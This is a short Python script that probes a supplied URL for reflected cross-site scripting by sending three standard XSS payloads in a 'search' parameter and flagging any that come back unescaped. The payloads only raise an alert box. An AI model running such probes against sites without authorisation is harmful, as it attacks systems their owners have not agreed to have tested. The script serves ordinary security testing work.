#!/usr/bin/env python3
import os, sys, requests
url = os.getenv('ARG_URL', '')
payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>']
print(f'[*] Testing {url} for XSS...')
for p in payloads:
    try:
        test_url = f'{url}?search={p}'
        r = requests.get(test_url, timeout=5)
        if p in r.text:
            print(f'[!] Possible XSS: {p}')
    except:
        pass
print('[+] Test completed')
